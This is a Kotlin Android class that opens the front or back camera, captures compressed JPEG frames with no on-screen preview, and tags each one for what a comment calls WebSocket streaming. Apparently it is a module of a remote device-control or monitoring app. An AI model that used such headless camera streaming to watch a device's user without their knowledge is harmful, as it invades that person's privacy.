package com.systemlinker.features

import android.annotation.SuppressLint
import android.content.Context
import android.graphics.ImageFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.Handler
import android.os.HandlerThread

class CameraStreamer(
    private val context: Context,
    private val onFrameReady: (ByteArray) -> Unit
) {
    private var cameraDevice: CameraDevice? = null
    private var captureSession: CameraCaptureSession? = null
    private var imageReader: ImageReader? = null
    private var backgroundThread: HandlerThread? = null
    private var backgroundHandler: Handler? = null

    @SuppressLint("MissingPermission")
    fun startStreaming(isFront: Boolean) {
        if (cameraDevice != null) return

        backgroundThread = HandlerThread("CameraStreamer").apply { start() }
        backgroundHandler = Handler(backgroundThread!!.looper)

        val manager = context.getSystemService(Context.CAMERA_SERVICE) as CameraManager
        var targetCameraId: String? = null

        try {
            for (id in manager.cameraIdList) {
                val chars = manager.getCameraCharacteristics(id)
                val facing = chars.get(CameraCharacteristics.LENS_FACING)
                if (isFront && facing == CameraCharacteristics.LENS_FACING_FRONT) {
                    targetCameraId = id; break
                } else if (!isFront && facing == CameraCharacteristics.LENS_FACING_BACK) {
                    targetCameraId = id; break
                }
            }

            if (targetCameraId == null) return

            // 640x480 is optimal for real-time WebSocket MJPEG streaming
            imageReader = ImageReader.newInstance(640, 480, ImageFormat.JPEG, 2)
            imageReader?.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage()
                if (image != null) {
                    val buffer = image.planes[0].buffer
                    val bytes = ByteArray(buffer.remaining())
                    buffer.get(bytes)
                    image.close()

                    // Prepend 0x02 to identify as Camera Frame
                    val dataToSend = ByteArray(bytes.size + 1)
                    dataToSend[0] = 0x02
                    System.arraycopy(bytes, 0, dataToSend, 1, bytes.size)
                    onFrameReady(dataToSend)
                }
            }, backgroundHandler)

            manager.openCamera(targetCameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    startCaptureSession()
                }
                override fun onDisconnected(camera: CameraDevice) { stopStreaming() }
                override fun onError(camera: CameraDevice, error: Int) { stopStreaming() }
            }, backgroundHandler)

        } catch (e: Exception) {
            stopStreaming()
        }
    }

    private fun startCaptureSession() {
        try {
            val characteristics = (context.getSystemService(Context.CAMERA_SERVICE) as CameraManager).getCameraCharacteristics(cameraDevice!!.id)
            val sensorOrientation = characteristics.get(CameraCharacteristics.SENSOR_ORIENTATION) ?: 0

            val captureBuilder = cameraDevice!!.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW).apply {
                addTarget(imageReader!!.surface)
                set(CaptureRequest.JPEG_ORIENTATION, sensorOrientation)
                set(CaptureRequest.JPEG_QUALITY, 50.toByte()) // Heavy compression for speed
            }

            cameraDevice!!.createCaptureSession(listOf(imageReader!!.surface), object : CameraCaptureSession.StateCallback() {
                override fun onConfigured(session: CameraCaptureSession) {
                    captureSession = session
                    try {
                        captureSession!!.setRepeatingRequest(captureBuilder.build(), null, backgroundHandler)
                    } catch (e: Exception) {
                        stopStreaming()
                    }
                }
                override fun onConfigureFailed(session: CameraCaptureSession) { stopStreaming() }
            }, backgroundHandler)
        } catch (e: Exception) {
            stopStreaming()
        }
    }

    fun stopStreaming() {
        captureSession?.close()
        captureSession = null
        cameraDevice?.close()
        cameraDevice = null
        imageReader?.close()
        imageReader = null
        backgroundThread?.quitSafely()
        backgroundThread = null
        backgroundHandler = null
    }
}